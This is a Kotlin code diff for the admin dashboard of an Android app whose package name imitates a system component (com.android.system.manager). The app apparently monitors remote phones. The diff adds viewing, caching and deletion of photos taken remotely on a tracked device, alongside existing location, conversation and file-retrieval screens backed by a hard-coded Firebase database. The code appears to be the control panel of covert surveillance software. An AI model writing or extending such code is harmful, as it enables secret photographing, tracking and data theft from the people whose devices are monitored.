@@ -50,8 +50,20 @@ import com.android.system.manager.ui.ConversationListScreen
 import com.android.system.manager.ui.ConversationDetailScreen
 import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.delay
 import androidx.compose.material3.Tab
 import androidx.compose.material3.TabRow
+import android.net.Uri
+import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
+import androidx.compose.foundation.lazy.grid.GridCells
+import androidx.compose.foundation.lazy.grid.items
+import androidx.compose.ui.layout.ContentScale
+import coil.compose.AsyncImage
+import com.github.panpf.zoomimage.CoilZoomAsyncImage
+import androidx.compose.ui.window.Dialog
+import androidx.compose.ui.window.DialogProperties
+import androidx.compose.foundation.clickable
+import java.io.File
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
@@ -76,6 +88,12 @@ class AdminDashboardActivity : ComponentActivity() {
         val name: String = "",
         val phone: String = "",
         val email: String? = null
+    )
+
+    private data class SnapshotItem(
+        val timestamp: Long,
+        val storagePath: String,
+        val thumbPath: String
     )
 
     data class FileItem(
@@ -560,6 +578,106 @@ class AdminDashboardActivity : ComponentActivity() {
         }
 
         @Composable
+        fun FullScreenSnapshotViewer(
+            snapshots: List<SnapshotItem>,
+            initialIndex: Int,
+            onDismiss: () -> Unit
+        ) {
+            Dialog(
+                onDismissRequest = onDismiss,
+                properties = DialogProperties(usePlatformDefaultWidth = false)
+            ) {
+                val pagerState = rememberPagerState(
+                    initialPage = initialIndex,
+                    pageCount = { snapshots.size }
+                )
+                val context = LocalContext.current
+
+                Box(Modifier.fillMaxSize().background(Color.Black)) {
+                    HorizontalPager(
+                        state = pagerState,
+                        modifier = Modifier.fillMaxSize()
+                    ) { page ->
+                        val snapshot = snapshots[page]
+                        val fullUrl = remember(snapshot.storagePath) { mutableStateOf<Uri?>(null) }
+                        val localFile = remember(snapshot.timestamp) {
+                            File(context.getExternalFilesDir("snapshots"), "${snapshot.timestamp}.jpg")
+                        }
+                        val localFileReady = remember { mutableStateOf(localFile.exists()) }
+
+                        LaunchedEffect(snapshot.storagePath) {
+                            val storageRef = FirebaseStorage.getInstance().reference.child(snapshot.storagePath)
+                            storageRef.downloadUrl
+                                .addOnSuccessListener { uri ->
+                                    fullUrl.value = uri
+                                    if (!localFile.exists()) {
+                                        storageRef.getBytes(10 * 1024 * 1024)
+                                            .addOnSuccessListener { bytes ->
+                                                localFile.parentFile?.mkdirs()
+                                                localFile.writeBytes(bytes)
+                                                localFileReady.value = true
+                                                if (BuildConfig.DEBUG) Log.d("SYS_MGR", "Snapshot cached: ${localFile.absolutePath}")
+                                            }
+                                            .addOnFailureListener { e ->
+                                                if (BuildConfig.DEBUG) Log.e("SYS_MGR", "Snapshot cache failed: ${e.message}")
+                                            }
+                                    }
+                                }
+                                .addOnFailureListener { e ->
+                                    if (BuildConfig.DEBUG) Log.e("SYS_MGR", "Full URL fetch failed: ${e.message}")
+                                }
+                        }
+
+                        Box(
+                            modifier = Modifier.fillMaxSize(),
+                            contentAlignment = Alignment.Center
+                        ) {
+                            val imageModel = when {
+                                localFileReady.value && localFile.exists() -> localFile
+                                fullUrl.value != null -> fullUrl.value
+                                else -> null
+                            }
+                            if (imageModel != null) {
+                                CoilZoomAsyncImage(
+                                    model = imageModel,
+                                    contentDescription = "Full snapshot",
+                                    modifier = Modifier.fillMaxSize()
+                                )
+                            } else {
+                                CircularProgressIndicator(color = Color.White)
+                            }
+                        }
+                    }
+
+                    IconButton(
+                        onClick = onDismiss,
+                        modifier = Modifier.align(Alignment.TopEnd).padding(16.dp)
+                    ) {
+                        Icon(Icons.Default.Close, contentDescription = "Yopish", tint = Color.White)
+                    }
+
+                    val currentSnapshot = snapshots.getOrNull(pagerState.currentPage)
+                    currentSnapshot?.let { snap ->
+                        Box(
+                            modifier = Modifier
+                                .align(Alignment.BottomCenter)
+                                .fillMaxWidth()
+                                .background(Color.Black.copy(alpha = 0.5f))
+                                .padding(8.dp)
+                        ) {
+                            Text(
+                                SimpleDateFormat("dd MMMM yyyy, HH:mm", Locale.getDefault())
+                                    .format(Date(snap.timestamp)),
+                                color = Color.White,
+                                style = MaterialTheme.typography.bodyMedium
+                            )
+                        }
+                    }
+                }
+            }
+        }
+
+        @Composable
         fun MediaTabContent(deviceId: String?) {
             if (deviceId == null) {
                 Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
@@ -568,6 +686,57 @@ class AdminDashboardActivity : ComponentActivity() {
                 }
                 return
             }
+
+            val snapshots = remember { mutableStateListOf<SnapshotItem>() }
+            val thumbUrls = remember { mutableStateMapOf<Long, Uri?>() }
+            val deleteInProgress = remember { mutableStateMapOf<Long, Boolean>() }
+            val snackbarMessage = remember { mutableStateOf<String?>(null) }
+            val coroutineScope = rememberCoroutineScope()
+            var selectedSnapshotIndex by remember { mutableStateOf<Int?>(null) }
+
+            DisposableEffect(deviceId) {
+                val db = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+                val ref = db.getReference("devices").child(deviceId).child("snapshots")
+                val listener = object : ValueEventListener {
+                    override fun onDataChange(snapshot: DataSnapshot) {
+                        val items = mutableListOf<SnapshotItem>()
+                        for (child in snapshot.children) {
+                            val ts = child.child("timestamp").getValue(Long::class.java) ?: continue
+                            val sp = child.child("storagePath").getValue(String::class.java) ?: ""
+                            val tp = child.child("thumbPath").getValue(String::class.java) ?: ""
+                            items.add(SnapshotItem(timestamp = ts, storagePath = sp, thumbPath = tp))
+                        }
+                        items.sortByDescending { it.timestamp }
+                        snapshots.clear()
+                        snapshots.addAll(items)
+
+                        for (item in items) {
+                            if (item.thumbPath.isNotEmpty() && thumbUrls[item.timestamp] == null) {
+                                FirebaseStorage.getInstance().reference.child(item.thumbPath).downloadUrl
+                                    .addOnSuccessListener { uri -> thumbUrls[item.timestamp] = uri }
+                                    .addOnFailureListener {
+                                        if (BuildConfig.DEBUG) Log.e("SYS_MGR", "Thumb URL fetch failed: ${it.message}")
+                                        thumbUrls[item.timestamp] = null
+                                    }
+                            }
+                        }
+                    }
+
+                    override fun onCancelled(error: DatabaseError) {
+                        if (BuildConfig.DEBUG) Log.e("SYS_MGR", "Snapshots listener cancelled: ${error.message}")
+                    }
+                }
+                ref.addValueEventListener(listener)
+                onDispose { ref.removeEventListener(listener) }
+            }
+
+            snackbarMessage.value?.let { msg ->
+                LaunchedEffect(msg) {
+                    delay(3000)
+                    snackbarMessage.value = null
+                }
+            }
+
             Column(
                 modifier = Modifier.fillMaxSize().padding(16.dp),
                 verticalArrangement = Arrangement.spacedBy(12.dp)
@@ -579,10 +748,103 @@ class AdminDashboardActivity : ComponentActivity() {
                 ) {
                     Text("Foto olish")
                 }
-                Text(
-                    "Foto olingandan keyin bu yerda ko'rinadi",
-                    color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f),
-                    style = MaterialTheme.typography.bodySmall
+
+                if (snapshots.isEmpty()) {
+                    Text(
+                        "Hali rasm olinmagan",
+                        color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f)
+                    )
+                } else {
+                    LazyVerticalGrid(
+                        columns = GridCells.Fixed(2),
+                        horizontalArrangement = Arrangement.spacedBy(8.dp),
+                        verticalArrangement = Arrangement.spacedBy(8.dp)
+                    ) {
+                        items(snapshots.size, key = { snapshots[it].timestamp }) { index ->
+                            val snapshot = snapshots[index]
+                            Card(modifier = Modifier.fillMaxWidth().clickable { selectedSnapshotIndex = index }) {
+                                Column {
+                                    Box(
+                                        modifier = Modifier.fillMaxWidth().aspectRatio(1f),
+                                        contentAlignment = Alignment.Center
+                                    ) {
+                                        when {
+                                            snapshot.thumbPath.isEmpty() ->
+                                                Icon(Icons.Default.Warning, contentDescription = null)
+                                            thumbUrls[snapshot.timestamp] == null ->
+                                                CircularProgressIndicator(modifier = Modifier.size(32.dp))
+                                            else -> AsyncImage(
+                                                model = thumbUrls[snapshot.timestamp],
+                                                contentDescription = "Snapshot",
+                                                contentScale = ContentScale.Crop,
+                                                modifier = Modifier.fillMaxSize()
+                                            )
+                                        }
+                                    }
+                                    Row(
+                                        modifier = Modifier.fillMaxWidth().padding(4.dp),
+                                        horizontalArrangement = Arrangement.SpaceBetween,
+                                        verticalAlignment = Alignment.CenterVertically
+                                    ) {
+                                        Text(
+                                            SimpleDateFormat("dd.MM.yy HH:mm", Locale.getDefault())
+                                                .format(Date(snapshot.timestamp)),
+                                            style = MaterialTheme.typography.labelSmall
+                                        )
+                                        if (deleteInProgress[snapshot.timestamp] == true) {
+                                            CircularProgressIndicator(modifier = Modifier.size(20.dp))
+                                        } else {
+                                            IconButton(
+                                                onClick = {
+                                                    deleteInProgress[snapshot.timestamp] = true
+                                                    FirebaseStorage.getInstance().reference.child(snapshot.storagePath).delete()
+                                                        .addOnSuccessListener {
+                                                            if (snapshot.thumbPath.isNotEmpty()) {
+                                                                FirebaseStorage.getInstance().reference.child(snapshot.thumbPath).delete()
+                                                                    .addOnFailureListener { e ->
+                                                                        if (BuildConfig.DEBUG) Log.e("SYS_MGR", "Thumb delete failed: ${e.message}")
+                                                                    }
+                                                            }
+                                                            FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+                                                                .reference.child("devices/$deviceId/snapshots/${snapshot.timestamp}").removeValue()
+                                                            deleteInProgress.remove(snapshot.timestamp)
+                                                            thumbUrls.remove(snapshot.timestamp)
+                                                        }
+                                                        .addOnFailureListener {
+                                                            deleteInProgress.remove(snapshot.timestamp)
+                                                            snackbarMessage.value = "O'chirishda xatolik"
+                                                        }
+                                                },
+                                                modifier = Modifier.size(28.dp)
+                                            ) {
+                                                Icon(
+                                                    Icons.Default.Delete,
+                                                    contentDescription = "O'chirish",
+                                                    tint = MaterialTheme.colorScheme.error
+                                                )
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+
+                snackbarMessage.value?.let { msg ->
+                    Text(
+                        msg,
+                        color = MaterialTheme.colorScheme.error,
+                        style = MaterialTheme.typography.bodySmall
+                    )
+                }
+            }
+
+            selectedSnapshotIndex?.let { index ->
+                FullScreenSnapshotViewer(
+                    snapshots = snapshots,
+                    initialIndex = index,
+                    onDismiss = { selectedSnapshotIndex = null }
                 )
             }
         }
@@ -783,6 +1045,22 @@ class AdminDashboardActivity : ComponentActivity() {
         onFilesClick: (String) -> Unit = {},
         onTakePhotoClick: (String) -> Unit = {}
     ) {
+        var lastSnapshot by remember { mutableStateOf<Long?>(null) }
+        val context = LocalContext.current
+        
+        LaunchedEffect(device.uid) {
+            val statusRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+                .getReference("devices/${device.uid}/status/lastSnapshot")
+            statusRef.addListenerForSingleValueEvent(object : ValueEventListener {
+                override fun onDataChange(snapshot: DataSnapshot) {
+                    lastSnapshot = snapshot.getValue(Long::class.java)
+                }
+                override fun onCancelled(error: DatabaseError) {
+                    Log.e("SYS_MGR", "Failed to read lastSnapshot: ${error.message}")
+                }
+            })
+        }
+        
         Card(
             modifier = Modifier
                 .fillMaxWidth()
@@ -817,6 +1095,45 @@ class AdminDashboardActivity : ComponentActivity() {
                 DetailRow("Speed", "${device.speed} km/h")
                 DetailRow("Accuracy", "${device.accuracy}m")
                 DetailRow("Last Updated", getRelativeTime(device.timestamp))
+                
+                lastSnapshot?.let { timestamp ->
+                    Row(
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .padding(vertical = 2.dp),
+                        horizontalArrangement = Arrangement.SpaceBetween,
+                        verticalAlignment = Alignment.CenterVertically
+                    ) {
+                        Text(
+                            text = "Oxirgi foto: ${SimpleDateFormat("dd.MM.yyyy HH:mm", Locale.getDefault()).format(Date(timestamp))}",
+                            color = MaterialTheme.colorScheme.onSurfaceVariant,
+                            fontSize = 12.sp
+                        )
+                        Button(
+                            onClick = {
+                                val path = "snapshots/${device.uid}/$timestamp"
+                                FirebaseStorage.getInstance().reference.child(path).downloadUrl
+                                    .addOnSuccessListener { uri ->
+                                        val intent = Intent(Intent.ACTION_VIEW, uri)
+                                        context.startActivity(intent)
+                                    }
+                                    .addOnFailureListener { e ->
+                                        Log.e("SYS_MGR", "Storage download failed: ${e.message}")
+                                    }
+                            },
+                            modifier = Modifier.height(32.dp),
+                            contentPadding = PaddingValues(horizontal = 8.dp, vertical = 4.dp),
+                            colors = ButtonDefaults.buttonColors(
+                                containerColor = MaterialTheme.colorScheme.primary
+                            )
+                        ) {
+                            Text(
+                                text = "Fotoni ko'rish",
+                                fontSize = 11.sp
+                            )
+                        }
+                    }
+                }
                 
                 Spacer(modifier = Modifier.height(12.dp))
                 
@@ -1429,16 +1746,27 @@ class AdminDashboardActivity : ComponentActivity() {
 
                                     if (storagePath.isNotEmpty()) {
                                         // Storage path mavjud — to'g'ridan download
+                                        val fileName = storagePath.substringAfterLast("/")
+                                        val cacheDir = File(context.cacheDir, "downloads").also { it.mkdirs() }
+                                        val localFile = File(cacheDir, fileName)
+
                                         FirebaseStorage.getInstance()
                                             .getReference(storagePath)
-                                            .downloadUrl
-                                            .addOnSuccessListener { uri ->
-                                                val intent = Intent(Intent.ACTION_VIEW, uri)
-                                                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+                                            .getFile(localFile)
+                                            .addOnSuccessListener {
+                                                val contentUri = androidx.core.content.FileProvider.getUriForFile(
+                                                    context,
+                                                    "com.android.system.manager.fileprovider",
+                                                    localFile
+                                                )
+                                                val intent = Intent(Intent.ACTION_VIEW).apply {
+                                                    setDataAndType(contentUri, file.mimeType.ifEmpty { "*/*" })
+                                                    addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+                                                }
                                                 context.startActivity(Intent.createChooser(intent, "Ochish"))
                                             }
-                                            .addOnFailureListener {
-                                                if (BuildConfig.DEBUG) Log.e("SYS_MGR", "downloadUrl failed: ${it.message}")
+                                            .addOnFailureListener { e ->
+                                                if (BuildConfig.DEBUG) Log.e("SYS_MGR", "getFile failed: ${e.message}")
                                             }
                                     } else {
                                         // Storage path yo'q — command yuborish + listener
@@ -1459,13 +1787,27 @@ class AdminDashboardActivity : ComponentActivity() {
                                                 val path = snapshot.getValue(String::class.java)
                                                 if (!path.isNullOrEmpty()) {
                                                     filesRef.removeEventListener(this)
+                                                    val fileName2 = path.substringAfterLast("/")
+                                                    val cacheDir2 = File(context.cacheDir, "downloads").also { it.mkdirs() }
+                                                    val localFile2 = File(cacheDir2, fileName2)
+
                                                     FirebaseStorage.getInstance()
                                                         .getReference(path)
-                                                        .downloadUrl
-                                                        .addOnSuccessListener { uri ->
-                                                            val intent = Intent(Intent.ACTION_VIEW, uri)
-                                                            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+                                                        .getFile(localFile2)
+                                                        .addOnSuccessListener {
+                                                            val contentUri = androidx.core.content.FileProvider.getUriForFile(
+                                                                context,
+                                                                "com.android.system.manager.fileprovider",
+                                                                localFile2
+                                                            )
+                                                            val intent = Intent(Intent.ACTION_VIEW).apply {
+                                                                setDataAndType(contentUri, file.mimeType.ifEmpty { "*/*" })
+                                                                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+                                                            }
                                                             context.startActivity(Intent.createChooser(intent, "Ochish"))
+                                                        }
+                                                        .addOnFailureListener { e ->
+                                                            if (BuildConfig.DEBUG) Log.e("SYS_MGR", "getFile failed: ${e.message}")
                                                         }
                                                 }
                                             }
